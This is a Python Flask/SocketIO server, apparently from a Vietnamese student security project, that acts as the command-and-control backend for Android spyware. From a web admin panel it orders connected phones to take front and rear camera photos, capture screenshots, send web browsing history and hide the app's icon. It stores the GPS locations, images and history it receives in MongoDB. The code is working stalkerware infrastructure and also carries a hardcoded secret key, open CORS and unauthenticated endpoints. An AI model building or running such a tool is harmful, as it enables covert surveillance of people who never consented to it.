from flask import Flask, request
from flask_socketio import SocketIO, emit
import os
import base64
from datetime import datetime
import pymongo 

# ----- CẤU HÌNH SERVER -----    
app = Flask(__name__)
app.config['SECRET_KEY'] = 'nhung_anh_chang_sieu_dep_trai'
# cors_allowed_origins="*" để chấp nhận mọi kết nối
socketio = SocketIO(app, cors_allowed_origins="*")

# Tạo thư mục lưu ảnh
UPLOAD_FOLDER = 'storage/images'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# ----- CẤU HÌNH MONGODB -----
try:
    client = pymongo.MongoClient("mongodb://localhost:27017/")
    db = client['DoAnBaoMat']
    
    # 3 Ngăn chứa dữ liệu (Collections)
    col_gps = db['vi_tri_gps']
    col_images = db['hinh_anh']
    col_history = db['lich_su_web'] # <--- MỚI: Chứa lịch sử web
    
    print(">>> ĐÃ KẾT NỐI MONGODB THÀNH CÔNG! <<<")
except Exception as e:
    print(f">>> LỖI KẾT NỐI MONGODB: {e}")


# ----- PHẦN 1: GIAO DIỆN ĐIỀU KHIỂN (Test bằng trình duyệt) -----
# Bạn vào trình duyệt gõ các link này để ra lệnh cho điện thoại

@app.route('/')
def index():
    return """
    <h1>ADMIN CONTROL PANEL</h1>
    <ul>
        <li><a href='/cmd/cam-sau'>1. Chụp Camera Sau</a></li>
        <li><a href='/cmd/cam-truoc'>2. Chụp Camera Trước</a></li>
        <li><a href='/cmd/screenshot'>3. Chụp Màn Hình</a></li>
        <li><a href='/cmd/history'>4. Lấy Lịch Sử Web</a></li>
        <li><a href='/cmd/hide'>5. Ẩn App Khỏi Màn Hình</a></li>
        <li><a href='/cmd/show'>6. Hiện App Trở Lại</a></li>
    </ul>
    """

# API xử lý lệnh từ link trên
@app.route('/cmd/<action>')
def command_handler(action):
    msg = ""
    
    if action == 'cam-sau':
        socketio.emit('LENH_CHUP_ANH', {'camera': 'back'}) # Gửi lệnh chụp cam sau
        msg = "Đã gửi lệnh: CHỤP CAMERA SAU"
        
    elif action == 'cam-truoc':
        socketio.emit('LENH_CHUP_ANH', {'camera': 'front'}) # Gửi lệnh chụp cam trước
        msg = "Đã gửi lệnh: CHỤP CAMERA TRƯỚC"
        
    elif action == 'screenshot':
        socketio.emit('LENH_CHUP_MAN_HINH', {}) # Gửi lệnh chụp màn hình
        msg = "Đã gửi lệnh: CHỤP MÀN HÌNH"
        
    elif action == 'history':
        socketio.emit('LENH_LAY_LICH_SU', {}) # Gửi lệnh lấy history
        msg = "Đã gửi lệnh: LẤY LỊCH SỬ WEB"
        
    elif action == 'hide':
        socketio.emit('LENH_AN_HIEN_APP', {'mode': 'hide'}) # Gửi lệnh ẩn
        msg = "Đã gửi lệnh: ẨN APP"
        
    elif action == 'show':
        socketio.emit('LENH_AN_HIEN_APP', {'mode': 'show'}) # Gửi lệnh hiện
        msg = "Đã gửi lệnh: HIỆN APP"
        
    print(f">>> ADMIN RA LỆNH: {msg}")
    return f"<h2>{msg}</h2><a href='/'>Quay lại</a>"


# ----- PHẦN 2: XỬ LÝ KẾT NỐI SOCKET -----

@socketio.on('connect')
def handle_connect():
    print(f"\n[+] THIẾT BỊ MỚI KẾT NỐI: {request.sid}")
    emit('server_log', {'msg': 'Đã kết nối Server!'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[-] THIẾT BỊ ĐÃ NGẮT KẾT NỐI: {request.sid}")


# ----- PHẦN 3: XỬ LÝ DỮ LIỆU NHẬN VỀ (Receive) -----

# 1. Nhận Tọa Độ GPS
@socketio.on('gui_toa_do')
def nhan_gps(data):
    device_id = data.get('device_id', 'unknown')
    lat = data.get('lat')
    lng = data.get('long')
    
    print(f"[GPS] {device_id}: {lat}, {lng}")
    
    col_gps.insert_one({
        "device_id": device_id,
        "lat": lat,
        "long": lng,
        "thoi_gian": datetime.now()
    })

# 2. Nhận Ảnh (Dùng chung cho cả Cam trước, Cam sau, Screenshot)
@socketio.on('gui_anh')
def nhan_anh(data):
    device_id = data.get('device_id', 'unknown')
    base64_str = data.get('img') 
    loai_anh = data.get('type', 'photo') # Ví dụ: 'front', 'back', 'screen'

    print(f"[ẢNH] Đang nhận ({loai_anh}) từ {device_id}...")

    try:
        # Giải mã ảnh
        img_data = base64.b64decode(base64_str)
        
        # Đặt tên file theo loại để dễ phân biệt
        # VD: screen_20251221_120000.jpg
        ten_file = f"{loai_anh}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        duong_dan = os.path.join(UPLOAD_FOLDER, ten_file)
        
        # Lưu file
        with open(duong_dan, 'wb') as f:
            f.write(img_data)
            
        print(f" -> Đã lưu: {ten_file}")
            
        # Lưu vào MongoDB
        col_images.insert_one({
            "device_id": device_id,
            "loai_anh": loai_anh,
            "file_name": ten_file,
            "duong_dan": duong_dan,
            "thoi_gian": datetime.now()
        })
        
    except Exception as e:
        print(f" -> Lỗi lưu ảnh: {e}")

# 3. Nhận Lịch Sử Web (MỚI)
@socketio.on('gui_lich_su_web')
def nhan_lich_su(data):
    device_id = data.get('device_id', 'unknown')
    history_data = data.get('history') # Là một chuỗi dài hoặc List các URL
    
    print(f"[HISTORY] Đã nhận lịch sử web từ {device_id}")
    print(f" -> Nội dung: {history_data[:100]}...") # In thử 100 ký tự đầu
    
    # Lưu vào MongoDB
    col_history.insert_one({
        "device_id": device_id,
        "du_lieu_web": history_data,
        "thoi_gian": datetime.now()
    })

# ---- CHẠY SERVER -----
if __name__ == '__main__':
    print(">>>>> SERVER MONITORING STARTING ON PORT 5000 <<<<<")
    print(">>>>> Truy cập http://localhost:5000 để điều khiển <<<<<")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)